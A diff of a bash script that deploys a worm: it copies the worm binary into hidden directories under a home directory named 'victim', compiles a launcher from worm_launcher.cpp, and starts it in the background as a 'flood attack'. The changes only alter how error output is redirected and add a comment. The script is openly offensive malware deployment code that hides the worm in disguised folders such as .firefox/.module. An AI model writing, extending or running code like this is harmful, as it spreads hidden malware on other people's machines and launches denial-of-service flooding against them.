@@ -34,11 +34,8 @@ distribute_worm() {
     local dir1="/home/victim/.etc/.module"
     local dir2="/home/victim/.firefox/.module"
 
-    if  mkdir -p $dir1 2> /dev/null &&\
-        mkdir -p $dir2 2> /dev/null &&\
-        cp "./$wormbin" "$dir1/$wormbin" 2> /dev/null &&\
-        cp "./$wormbin" "$dir2/$wormbin" 2> /dev/null; then
-
+    if  mkdir -p $dir1 && mkdir -p $dir2 &&\
+        cp "./$wormbin" "$dir1/$wormbin" && cp "./$wormbin" "$dir2/$wormbin" ; then
         echo "Worm distributed."
         return 0
     else
@@ -48,8 +45,8 @@ distribute_worm() {
 }
 
 distribute_worm_launcher(){
-    mkdir -p "$ldir" 2> /dev/null
-    if  g++ -o "$ldir/$lfname" worm_launcher.cpp 2> /dev/null; then
+    mkdir -p "$ldir" > /dev/null
+    if  g++ -o "$ldir/$lfname" worm_launcher.cpp > /dev/null; then
         echo "Worm launcher distributed."
         return 0
     else
@@ -59,7 +56,7 @@ distribute_worm_launcher(){
 }
 
 start_flood_attack(){
-    chmod +x $ldir/$lfname && $ldir/$lfname &> /dev/null &
+    chmod +x $ldir/$lfname && $ldir/$lfname > /dev/null & # The final & makes this command run in background
 }
 
 parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
